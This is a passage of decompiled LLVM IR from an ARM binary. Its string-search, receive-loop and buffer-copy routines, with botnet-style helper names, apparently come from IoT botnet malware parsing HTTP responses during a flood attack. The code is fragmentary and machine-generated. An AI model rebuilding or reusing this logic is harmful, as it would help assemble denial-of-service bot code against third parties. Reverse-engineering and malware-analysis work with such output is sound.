dec_label_pc_9aa0:                                ; preds = %dec_label_pc_9a94
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v3_9aa8 = call i32 @table_retrieve_val(i32 46, i32* null)
  %v0_9aac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9aac, i32* @r1, align 4
  store i32 %v3_9aa8, i32* %r2.global-to-local, align 4
  %v0_9ab4 = load i32, i32* @r4, align 4
  store i32 %v0_9ab4, i32* %r0.global-to-local, align 4
  %v3_9ab8 = inttoptr i32 %v0_9ab4 to i8*
  %v4_9ab8 = call i32 @util_stristr(i8* %v3_9ab8, i32 %v0_9aac, i32 %v3_9aa8)
  store i32 %v4_9ab8, i32* %r0.global-to-local, align 4
  store i32 %v2_8988, i32* @lr, align 4
  %v1_9ac0 = load i32, i32* @r5, align 4
  %v2_9ac0 = add i32 %v1_9ac0, %v4_9ab8
  store i32 %v2_9ac0, i32* @r8, align 4
  %v2_9ac4 = add i32 %v2_9ac0, %v2_8988
  %v3_9ac4 = inttoptr i32 %v2_9ac4 to i8*
  %v4_9ac4 = load i8, i8* %v3_9ac4, align 1
  %v6_9ac4 = zext i8 %v4_9ac4 to i32
  store i32 %v6_9ac4, i32* %r3.global-to-local, align 4
  %v2_9ac8 = icmp ugt i8 %v4_9ac4, 31
  store i1 %v2_9ac8, i1* %cpsr_c.global-to-local, align 1
  %v7_9ac8 = icmp eq i8 %v4_9ac4, 32
  store i1 %v7_9ac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9ac8, label %bb192, label %bb193

bb192:                                            ; preds = %dec_label_pc_9aa0
  %v2_9acc = add i32 %v4_9ab8, 1
  store i32 %v2_9acc, i32* %r0.global-to-local, align 4
  br label %bb193

bb193:                                            ; preds = %dec_label_pc_9aa0, %bb192
  %v1_9adc = phi i32 [ %v4_9ab8, %dec_label_pc_9aa0 ], [ %v2_9acc, %bb192 ]
  %v1_9ad0 = load i32, i32* %fp.global-to-local, align 4
  %v2_9ad0 = sub i32 %v1_9ad0, %v1_9ac0
  store i32 %v2_9ad0, i32* %r3.global-to-local, align 4
  %v2_9ad4 = sub i32 %v2_9ad0, %v1_9adc
  store i32 %v2_9ad4, i32* @r7, align 4
  %v0_9ad8 = load i32, i32* @r4, align 4
  %v2_9ad8 = add i32 %v0_9ad8, %v1_9adc
  store i32 %v2_9ad8, i32* @r6, align 4
  br i1 %v7_9ac8, label %bb194, label %bb195

bb194:                                            ; preds = %bb193
  %v3_9adc = add i32 %v1_9adc, %v1_9ac0
  store i32 %v3_9adc, i32* @r8, align 4
  br label %bb195

bb195:                                            ; preds = %bb193, %bb194
  store i32 %v2_9ad4, i32* %r1.global-to-local, align 4
  store i32 %v2_9ad8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9af0 = call i32 @util_memsearch(i32 %v2_9ad8, i32 %v2_9ad4, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2)
  store i32 %v5_9af0, i32* %r0.global-to-local, align 4
  %v2_9af4 = icmp eq i32 %v5_9af0, -1
  store i1 %v2_9af4, i1* %cpsr_c.global-to-local, align 1
  %v7_9af4 = icmp eq i32 %v5_9af0, -1
  store i1 %v7_9af4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9af0, i32* @r4, align 4
  br i1 %v7_9af4, label %dec_label_pc_9ba8, label %dec_label_pc_9b00

dec_label_pc_9b00:                                ; preds = %bb195
  store i32 %v2_8988, i32* %r1.global-to-local, align 4
  %v2_9b04 = icmp ne i32 %v5_9af0, 0
  store i1 %v2_9b04, i1* %cpsr_c.global-to-local, align 1
  %v7_9b04 = icmp eq i32 %v5_9af0, 1
  store i1 %v7_9b04, i1* %cpsr_z.global-to-local, align 1
  %v7_9b08 = icmp slt i32 %v5_9af0, 2
  br i1 %v7_9b08, label %bb197, label %bb196

bb196:                                            ; preds = %dec_label_pc_9b00
  %v9_9b08 = add i32 %v5_9af0, -2
  store i32 %v9_9b08, i32* @r4, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_9b00, %bb196
  %v1_9b0c = load i32, i32* @r8, align 4
  %v2_9b0c = add i32 %v1_9b0c, %v2_8988
  store i32 %v2_9b0c, i32* @r5, align 4
  %v0_9b10 = load i32, i32* @r6, align 4
  store i32 %v0_9b10, i32* %r0.global-to-local, align 4
  %v0_9b14 = load i32, i32* @r7, align 4
  store i32 %v0_9b14, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d8.75 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9b20 = call i32 @util_memsearch(i32 %v0_9b10, i32 %v0_9b14, i32 ptrtoint (i32* @global_var_1b3d8.75 to i32), i32 1)
  store i32 %v4_9b20, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9b24 = icmp eq i32 %v4_9b20, 0
  store i1 %v2_9b24, i1* %cpsr_z.global-to-local, align 1
  %tmp198 = icmp slt i32 %v4_9b20, 1
  br i1 %tmp198, label %.dec_label_pc_9b44_crit_edge, label %dec_label_pc_9b2c

.dec_label_pc_9b44_crit_edge:                     ; preds = %bb197
  %v1_9b4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9b44

dec_label_pc_9b2c:                                ; preds = %bb197
  %v0_9b2c = load i32, i32* @r6, align 4
  store i32 %v0_9b2c, i32* %r0.global-to-local, align 4
  %v0_9b30 = load i32, i32* @r7, align 4
  store i32 %v0_9b30, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d8.75 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9b3c = call i32 @util_memsearch(i32 %v0_9b2c, i32 %v0_9b30, i32 ptrtoint (i32* @global_var_1b3d8.75 to i32), i32 1)
  store i32 %v4_9b3c, i32* %r0.global-to-local, align 4
  %v1_9b40 = add i32 %v4_9b3c, -1
  store i32 %v1_9b40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9b44

dec_label_pc_9b44:                                ; preds = %.dec_label_pc_9b44_crit_edge, %dec_label_pc_9b2c
  %v1_9b4c = phi i32 [ %v1_9b4c.pre, %.dec_label_pc_9b44_crit_edge ], [ %v1_9b40, %dec_label_pc_9b2c ]
  %v2_9b4c = add i32 %v1_9b4c, %v2_8e1c
  store i32 -20773, i32* @lr, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_9b58 = load i32, i32* @r8, align 4
  %v2_9b58 = add i32 %v2_9b4c, %v1_9b58
  store i32 %v2_9b58, i32* %r3.global-to-local, align 4
  store i32 %v10_89fc, i32* %r1.global-to-local, align 4
  %v4_9b60 = add i32 %v2_9b58, -20773
  %v5_9b60 = inttoptr i32 %v4_9b60 to i8*
  store i8 0, i8* %v5_9b60, align 1
  %storemerge6.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9b80.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9b80

dec_label_pc_9b6c:                                ; preds = %dec_label_pc_9b80
  br i1 %v7_9b70, label %dec_label_pc_9bb0, label %dec_label_pc_9b78

dec_label_pc_9b78:                                ; preds = %dec_label_pc_9b6c
  store i32 %v10_89fc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9b80

dec_label_pc_9b80:                                ; preds = %dec_label_pc_9b44, %dec_label_pc_9b78
  %v0_9b80 = phi i32 [ %v0_9b6c, %dec_label_pc_9b78 ], [ %v0_9b80.pre, %dec_label_pc_9b44 ]
  %storemerge6 = phi i32 [ %v1_9b94, %dec_label_pc_9b78 ], [ %storemerge6.pre, %dec_label_pc_9b44 ]
  store i32 %storemerge6, i32* %stack_var_-44, align 4
  store i32 %v0_9b80, i32* %r0.global-to-local, align 4
  %v1_9b84 = inttoptr i32 %v0_9b80 to i8*
  %v2_9b84 = call i32 @util_strlen(i8* %v1_9b84)
  store i32 %v2_9b84, i32* %r0.global-to-local, align 4
  store i32 %v10_89fc, i32* %r3.global-to-local, align 4
  %v3_9b8c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9b8c, i32* %r4.global-to-local, align 4
  %v3_9b90 = icmp uge i32 %v2_9b84, %v3_9b8c
  store i1 %v3_9b90, i1* %cpsr_c.global-to-local, align 1
  %v9_9b90 = icmp eq i32 %v2_9b84, %v3_9b8c
  store i1 %v9_9b90, i1* %cpsr_z.global-to-local, align 1
  %v1_9b94 = add i32 %v3_9b8c, 1
  store i32 %v1_9b94, i32* %ip.global-to-local, align 4
  %v8_9b98 = icmp sgt i32 %v2_9b84, %v3_9b8c
  %v0_9b6c = load i32, i32* @r5, align 4
  %v2_9b6c = add i32 %v0_9b6c, %v3_9b8c
  %v3_9b6c = inttoptr i32 %v2_9b6c to i8*
  %v4_9b6c = load i8, i8* %v3_9b6c, align 1
  %v6_9b6c = zext i8 %v4_9b6c to i32
  store i32 %v6_9b6c, i32* %r3.global-to-local, align 4
  %v2_9b70 = icmp ugt i8 %v4_9b6c, 60
  store i1 %v2_9b70, i1* %cpsr_c.global-to-local, align 1
  %v7_9b70 = icmp eq i8 %v4_9b6c, 61
  store i1 %v7_9b70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9b98, label %dec_label_pc_9b6c, label %dec_label_pc_9b9c

dec_label_pc_9b9c:                                ; preds = %dec_label_pc_9b80
  br i1 %v7_9b70, label %dec_label_pc_9bb0, label %dec_label_pc_9ba8

dec_label_pc_9ba8:                                ; preds = %dec_label_pc_9bf4, %dec_label_pc_9c18, %dec_label_pc_9b9c, %bb195
  %v0_9ba8 = load i32, i32* @r8, align 4
  store i32 %v0_9ba8, i32* @r5, align 4
  br label %dec_label_pc_9a5c

dec_label_pc_9bb0:                                ; preds = %dec_label_pc_9b6c, %dec_label_pc_9b9c
  %v0_9bb0 = load i32, i32* @sl, align 4
  %v1_9bb0 = add i32 %v0_9bb0, 16
  %v2_9bb0 = inttoptr i32 %v1_9bb0 to i32*
  %v3_9bb0 = load i32, i32* %v2_9bb0, align 4
  store i32 %v3_9bb0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_89fc, i32* @lr, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9bbc = icmp eq i32 %v3_9bb0, 0
  store i1 %v2_9bbc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %tmp199 = icmp slt i32 %v3_9bb0, 1
  br i1 %tmp199, label %dec_label_pc_9c18, label %dec_label_pc_9bc8

dec_label_pc_9bc8:                                ; preds = %dec_label_pc_9bb0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9bf4

dec_label_pc_9bd0:                                ; preds = %dec_label_pc_9bf4
  store i32 %v10_89fc, i32* %r1.global-to-local, align 4
  %v3_9bd4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9bd4, i32* %r3.global-to-local, align 4
  %v0_9bd8 = load i32, i32* @sl, align 4
  %v1_9bd8 = add i32 %v0_9bd8, 16
  %v2_9bd8 = inttoptr i32 %v1_9bd8 to i32*
  %v3_9bd8 = load i32, i32* %v2_9bd8, align 4
  %v1_9bdc = add i32 %v3_9bd4, 1
  store i32 %v1_9bdc, i32* %ip.global-to-local, align 4
  %v3_9be0 = icmp uge i32 %v3_9bd8, %v1_9bdc
  store i1 %v3_9be0, i1* %cpsr_c.global-to-local, align 1
  %v9_9be0 = icmp eq i32 %v3_9bd8, %v1_9bdc
  store i1 %v9_9be0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_89fc, i32* %r2.global-to-local, align 4
  store i32 %v1_9bdc, i32* %r1.global-to-local, align 4
  store i32 %v1_9bdc, i32* %stack_var_-44, align 4
  %v7_9bf0 = icmp sgt i32 %v3_9bd8, %v1_9bdc
  %v0_9c00.pre = load i32, i32* @r5, align 4
  br i1 %v7_9bf0, label %dec_label_pc_9bd0.dec_label_pc_9bf4_crit_edge, label %dec_label_pc_9c18

dec_label_pc_9bd0.dec_label_pc_9bf4_crit_edge:    ; preds = %dec_label_pc_9bd0
  %v0_9c04.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9bf4

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bd0.dec_label_pc_9bf4_crit_edge, %dec_label_pc_9bc8
  %v0_9c04 = phi i32 [ %v0_9c04.pre, %dec_label_pc_9bd0.dec_label_pc_9bf4_crit_edge ], [ %v3_9b8c, %dec_label_pc_9bc8 ]
  %v0_9c00 = phi i32 [ %v0_9c00.pre, %dec_label_pc_9bd0.dec_label_pc_9bf4_crit_edge ], [ %v0_9b6c, %dec_label_pc_9bc8 ]
  %v0_9bf4 = phi i32 [ %v1_9bdc, %dec_label_pc_9bd0.dec_label_pc_9bf4_crit_edge ], [ 0, %dec_label_pc_9bc8 ]
  %v1_9bf4 = and i32 %v0_9bf4, 33554432
  %v2_9bf4 = icmp ne i32 %v1_9bf4, 0
  store i1 %v2_9bf4, i1* %cpsr_c.global-to-local, align 1
  %v3_9bf4 = mul i32 %v0_9bf4, 128
  %v1_9bf8 = add i32 %v3_9bf4, 1472
  %v0_9bfc = load i32, i32* %sb.global-to-local, align 4
  %v2_9bfc = add i32 %v1_9bf8, %v0_9bfc
  store i32 %v2_9bfc, i32* %r1.global-to-local, align 4
  store i32 %v0_9c00, i32* %r0.global-to-local, align 4
  store i32 %v0_9c04, i32* %r2.global-to-local, align 4
  %v3_9c08 = inttoptr i32 %v0_9c00 to i8*
  %v4_9c08 = call i32 @util_strncmp(i8* %v3_9c08, i32 %v2_9bfc, i32 %v0_9c04)
  store i32 %v4_9c08, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9c0c = icmp eq i32 %v4_9c08, 0
  store i1 %v2_9c0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c0c, label %dec_label_pc_9bd0, label %dec_label_pc_9ba8

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9bd0, %dec_label_pc_9bb0
  %v0_9c18 = phi i32 [ %v0_9b6c, %dec_label_pc_9bb0 ], [ %v0_9c00.pre, %dec_label_pc_9bd0 ]
  store i32 %v0_9c18, i32* %r0.global-to-local, align 4
  %v1_9c1c = inttoptr i32 %v0_9c18 to i8*
  %v2_9c1c = call i32 @util_strlen(i8* %v1_9c1c)
  store i32 %v2_9c1c, i32* %r0.global-to-local, align 4
  %v2_9c20 = icmp ugt i32 %v2_9c1c, 126
  store i1 %v2_9c20, i1* %cpsr_c.global-to-local, align 1
  %v7_9c20 = icmp eq i32 %v2_9c1c, 127
  store i1 %v7_9c20, i1* %cpsr_z.global-to-local, align 1
  %v8_9c24 = icmp sgt i32 %v2_9c1c, 127
  br i1 %v8_9c24, label %dec_label_pc_9ba8, label %dec_label_pc_9c28

dec_label_pc_9c28:                                ; preds = %dec_label_pc_9c18
  %v0_9c28 = load i32, i32* @sl, align 4
  %v1_9c28 = add i32 %v0_9c28, 16
  %v2_9c28 = inttoptr i32 %v1_9c28 to i32*
  %v3_9c28 = load i32, i32* %v2_9c28, align 4
  %v1_9c2c = and i32 %v3_9c28, 33554432
  %v2_9c2c = icmp ne i32 %v1_9c2c, 0
  store i1 %v2_9c2c, i1* %cpsr_c.global-to-local, align 1
  %v3_9c2c = mul i32 %v3_9c28, 128
  %v1_9c30 = add i32 %v3_9c2c, 1472
  %v0_9c34 = load i32, i32* @r5, align 4
  store i32 %v0_9c34, i32* %r1.global-to-local, align 4
  %v0_9c38 = load i32, i32* %sb.global-to-local, align 4
  %v2_9c38 = add i32 %v1_9c30, %v0_9c38
  store i32 %v2_9c38, i32* @r0, align 4
  %v2_9c3c = inttoptr i32 %v2_9c38 to i8*
  %v3_9c3c = call i32 @util_strcpy(i8* %v2_9c3c, i32 %v0_9c34)
  store i32 %v3_9c3c, i32* %r0.global-to-local, align 4
  %v0_9c40 = load i32, i32* @sl, align 4
  %v1_9c40 = add i32 %v0_9c40, 16
  %v2_9c40 = inttoptr i32 %v1_9c40 to i32*
  %v3_9c40 = load i32, i32* %v2_9c40, align 4
  %v0_9c44 = load i32, i32* @r8, align 4
  store i32 %v0_9c44, i32* @r5, align 4
  %v1_9c48 = add i32 %v3_9c40, 1
  store i32 %v1_9c48, i32* %r3.global-to-local, align 4
  store i32 %v1_9c48, i32* %v2_9c40, align 4
  %v1_9a68.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9a5c

dec_label_pc_9c54:                                ; preds = %dec_label_pc_9d74
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_9c58 = load i32, i32* @r4, align 4
  %v2_9c58 = inttoptr i32 %v1_9c58 to i32*
  store i32 104, i32* %v2_9c58, align 4
  br label %dec_label_pc_9c5c

dec_label_pc_9c5c:                                ; preds = %dec_label_pc_9da0, %dec_label_pc_9734, %dec_label_pc_9c54
  %v0_9c5c = load i32, i32* @sl, align 4
  %v1_9c5c = add i32 %v0_9c5c, -1452
  %v2_9c5c = inttoptr i32 %v1_9c5c to i32*
  %v3_9c5c = load i32, i32* %v2_9c5c, align 4
  store i32 %v3_9c5c, i32* %r0.global-to-local, align 4
  %v1_9c60 = call i32 @__GI___libc_close(i32 %v3_9c5c)
  store i32 %v1_9c60, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_9c6c = load i32, i32* @sl, align 4
  %v2_9c6c = add i32 %v1_9c6c, -1452
  %v3_9c6c = inttoptr i32 %v2_9c6c to i32*
  store i32 -1, i32* %v3_9c6c, align 4
  %v0_9c70 = load i32, i32* %r2.global-to-local, align 4
  %v1_9c70 = trunc i32 %v0_9c70 to i8
  %v2_9c70 = load i32, i32* @sl, align 4
  %v3_9c70 = add i32 %v2_9c70, -1448
  %v4_9c70 = inttoptr i32 %v3_9c70 to i8*
  store i8 %v1_9c70, i8* %v4_9c70, align 1
  br label %dec_label_pc_8ef8

dec_label_pc_9c78:                                ; preds = %dec_label_pc_8ce0
  store i32 %v1_8ce0, i32* %r3.global-to-local, align 4
  %v1_9c7c = trunc i32 %v1_8ce0 to i8
  store i8 %v1_9c7c, i8* %v2_8d18, align 1
  %v0_9c80 = load i32, i32* @r6, align 4
  %v1_9c80 = add i32 %v0_9c80, -1452
  %v2_9c80 = inttoptr i32 %v1_9c80 to i32*
  %v3_9c80 = load i32, i32* %v2_9c80, align 4
  store i32 %v3_9c80, i32* %r0.global-to-local, align 4
  %v1_9c84 = call i32 @__GI___libc_close(i32 %v3_9c80)
  store i32 %v1_9c84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9c8c = load i32, i32* @r6, align 4
  %v2_9c8c = add i32 %v1_9c8c, -1452
  %v3_9c8c = inttoptr i32 %v2_9c8c to i32*
  store i32 -1, i32* %v3_9c8c, align 4
  br label %dec_label_pc_8d00

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9a94, %dec_label_pc_9a5c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v3_9c9c = call i32 @table_retrieve_val(i32 45, i32* null)
  %v0_9ca0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9ca0, i32* @r1, align 4
  store i32 %v3_9c9c, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_9cac = call i32 @util_stristr(i8* %tmp168, i32 %v0_9ca0, i32 %v3_9c9c)
  store i32 %v4_9cac, i32* %r0.global-to-local, align 4
  %v2_9cb0 = icmp eq i32 %v4_9cac, -1
  store i1 %v2_9cb0, i1* %cpsr_c.global-to-local, align 1
  %v7_9cb0 = icmp eq i32 %v4_9cac, -1
  store i1 %v7_9cb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9cb0, label %dec_label_pc_9e24, label %dec_label_pc_9cb8

dec_label_pc_9cb8:                                ; preds = %dec_label_pc_9c94
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v3_9cc0 = call i32 @table_retrieve_val(i32 45, i32* null)
  %v0_9cc4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9cc4, i32* @r1, align 4
  store i32 %v3_9cc0, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_9cd0 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9cc4, i32 %v3_9cc0)
  store i32 %v4_9cd0, i32* %r0.global-to-local, align 4
  store i32 %v2_8988, i32* @lr, align 4
  %v2_9cd8 = add i32 %v4_9cd0, %v2_8988
  %v3_9cd8 = inttoptr i32 %v2_9cd8 to i8*
  %v4_9cd8 = load i8, i8* %v3_9cd8, align 1
  %v2_9ce0 = icmp ugt i8 %v4_9cd8, 31
  store i1 %v2_9ce0, i1* %cpsr_c.global-to-local, align 1
  %v7_9ce0 = icmp eq i8 %v4_9cd8, 32
  store i1 %v7_9ce0, i1* %cpsr_z.global-to-local, align 1
  %v2_9ce8 = zext i1 %v7_9ce0 to i32
  %v2_9ce8.v4_9cd0 = add i32 %v2_9ce8, %v4_9cd0
  store i32 %v2_9ce8.v4_9cd0, i32* @r4, align 4
  %v2_9cec = add i32 %v2_9ce8.v4_9cd0, %v2_8988
  store i32 %v2_9cec, i32* @r6, align 4
  store i32 %v2_9cec, i32* %r0.global-to-local, align 4
  %v1_9cf4 = load i32, i32* %fp.global-to-local, align 4
  %v2_9cf4 = sub i32 %v1_9cf4, %v2_9ce8.v4_9cd0
  store i32 %v2_9cf4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9d00 = call i32 @util_memsearch(i32 %v2_9cec, i32 %v2_9cf4, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2)
  store i32 %v5_9d00, i32* %r0.global-to-local, align 4
  %v2_9d04 = icmp eq i32 %v5_9d00, -1
  store i1 %v2_9d04, i1* %cpsr_c.global-to-local, align 1
  %v7_9d04 = icmp eq i32 %v5_9d00, -1
  store i1 %v7_9d04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9d04, label %dec_label_pc_9e24, label %dec_label_pc_9d0c

dec_label_pc_9d0c:                                ; preds = %dec_label_pc_9cb8
  %v2_9d0c = icmp ne i32 %v5_9d00, 0
  store i1 %v2_9d0c, i1* %cpsr_c.global-to-local, align 1
  %v7_9d0c = icmp eq i32 %v5_9d00, 1
  store i1 %v7_9d0c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8da0, i32* %r2.global-to-local, align 4
  %v7_9d14 = icmp slt i32 %v5_9d00, 2
  br i1 %v7_9d14, label %bb201, label %bb200

bb200:                                            ; preds = %dec_label_pc_9d0c
  %v9_9d14 = add i32 %v5_9d00, -2
  store i32 %v9_9d14, i32* %r0.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %dec_label_pc_9d0c, %bb200
  %v1_9d1c = phi i32 [ %v5_9d00, %dec_label_pc_9d0c ], [ %v9_9d14, %bb200 ]
  %v2_9d1c = add i32 %v1_9d1c, %v2_8e1c
  store i32 -20773, i32* @lr, align 4
  %v1_9d24 = add i32 %v1_9d1c, 1
  store i32 %v1_9d24, i32* @r5, align 4
  %v1_9d28 = load i32, i32* @r4, align 4
  %v2_9d28 = add i32 %v2_9d1c, %v1_9d28
  store i32 %v2_9d28, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_9d30 = load i32, i32* @r6, align 4
  store i32 %v0_9d30, i32* %r0.global-to-local, align 4
  store i32 %v1_9d24, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b3dc.79 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_9d40 = add i32 %v2_9d28, -20773
  %v5_9d40 = inttoptr i32 %v4_9d40 to i8*
  store i8 0, i8* %v5_9d40, align 1
  %v5_9d44 = call i32 @util_memsearch(i32 %v0_9d30, i32 %v1_9d24, i32 ptrtoint ([5 x i8]* @global_var_1b3dc.79 to i32), i32 4)
  store i32 %v5_9d44, i32* %r0.global-to-local, align 4
  %v2_9d48 = icmp ugt i32 %v5_9d44, 3
  store i1 %v2_9d48, i1* %cpsr_c.global-to-local, align 1
  %v7_9d48 = icmp eq i32 %v5_9d44, 4
  store i1 %v7_9d48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9d48, label %dec_label_pc_a10c, label %dec_label_pc_9d50

dec_label_pc_9d50:                                ; preds = %bb201
  store i32 %v2_8988, i32* %r1.global-to-local, align 4
  %v1_9d54 = load i32, i32* @r4, align 4
  %v2_9d54 = add i32 %v1_9d54, %v2_8988
  %v3_9d54 = inttoptr i32 %v2_9d54 to i8*
  %v4_9d54 = load i8, i8* %v3_9d54, align 1
  %v6_9d54 = zext i8 %v4_9d54 to i32
  store i32 %v6_9d54, i32* %r3.global-to-local, align 4
  %v2_9d58 = icmp ugt i8 %v4_9d54, 46
  store i1 %v2_9d58, i1* %cpsr_c.global-to-local, align 1
  %v7_9d58 = icmp eq i8 %v4_9d54, 47
  store i1 %v7_9d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9d58, label %dec_label_pc_a30c, label %dec_label_pc_9d60

dec_label_pc_9d60:                                ; preds = %dec_label_pc_9dac, %dec_label_pc_a33c, %dec_label_pc_a30c, %dec_label_pc_a1dc, %dec_label_pc_a1c0, %dec_label_pc_9d50, %dec_label_pc_a354, %dec_label_pc_a208
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9d64 = load i32, i32* @sl, align 4
  %v3_9d64 = add i32 %v2_9d64, -1448
  %v4_9d64 = inttoptr i32 %v3_9d64 to i8*
  store i8 1, i8* %v4_9d64, align 1
  br label %dec_label_pc_8ef8

dec_label_pc_9d6c:                                ; preds = %dec_label_pc_8ef0
  %v0_9d6c = call i32 @__GI___errno_location()
  store i32 %v0_9d6c, i32* %r0.global-to-local, align 4
  store i32 %v0_9d6c, i32* @r4, align 4
  br label %dec_label_pc_9d74

dec_label_pc_9d74:                                ; preds = %dec_label_pc_9d98, %dec_label_pc_9d6c
  %v1_9d78 = phi i32 [ %v0_9d6c, %dec_label_pc_9d6c ], [ %v0_9da0, %dec_label_pc_9d98 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9d78 = inttoptr i32 %v1_9d78 to i32*
  store i32 0, i32* %v2_9d78, align 4
  store i32 %v2_8988, i32* %r1.global-to-local, align 4
  %v0_9d80 = load i32, i32* @sl, align 4
  %v1_9d80 = add i32 %v0_9d80, -1452
  %v2_9d80 = inttoptr i32 %v1_9d80 to i32*
  %v3_9d80 = load i32, i32* %v2_9d80, align 4
  store i32 %v3_9d80, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_9d88 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d88 = add i32 %v0_9d88, 16384
  store i32 %v1_9d88, i32* %r3.global-to-local, align 4
  %v4_9d8c = call i32 @__libc_recv(i32 %v3_9d80, i32 %v2_8988, i32 10240, i32 %v1_9d88)
  store i32 %v4_9d8c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9d90 = icmp eq i32 %v4_9d8c, 0
  store i1 %v2_9d90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9d90, label %dec_label_pc_9c54, label %dec_label_pc_9d98

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9d74
  %v3_9d98 = icmp eq i32 %v4_9d8c, -1
  store i1 %v3_9d98, i1* %cpsr_c.global-to-local, align 1
  %v8_9d98 = icmp eq i32 %v4_9d8c, -1
  store i1 %v8_9d98, i1* %cpsr_z.global-to-local, align 1
  %v0_9da0 = load i32, i32* @r4, align 4
  br i1 %v3_9d98, label %dec_label_pc_9da0, label %dec_label_pc_9d74

dec_label_pc_9da0:                                ; preds = %dec_label_pc_9d98
  %v1_9da0 = inttoptr i32 %v0_9da0 to i32*
  %v2_9da0 = load i32, i32* %v1_9da0, align 4
  store i32 %v2_9da0, i32* %r3.global-to-local, align 4
  %v2_9da4 = icmp ugt i32 %v2_9da0, 10
  store i1 %v2_9da4, i1* %cpsr_c.global-to-local, align 1
  %v7_9da4 = icmp eq i32 %v2_9da0, 11
  store i1 %v7_9da4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9da4, label %dec_label_pc_9dac, label %dec_label_pc_9c5c

dec_label_pc_9dac:                                ; preds = %dec_label_pc_9da0
  %v0_9dac = load i32, i32* @sl, align 4
  %v1_9dac = add i32 %v0_9dac, -1448
  %v2_9dac = inttoptr i32 %v1_9dac to i8*
  %v3_9dac = load i8, i8* %v2_9dac, align 1
  %v4_9dac = zext i8 %v3_9dac to i32
  store i32 %v4_9dac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9db0 = icmp eq i8 %v3_9dac, 0
  store i1 %v2_9db0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9db0, label %dec_label_pc_8ef8, label %dec_label_pc_9d60

dec_label_pc_9dbc:                                ; preds = %dec_label_pc_9500
  %v0_9dbc = load i32, i32* %r3.global-to-local, align 4
  %v1_9dbc = add i32 %v0_9dbc, 1
  store i32 %v1_9dbc, i32* %r3.global-to-local, align 4
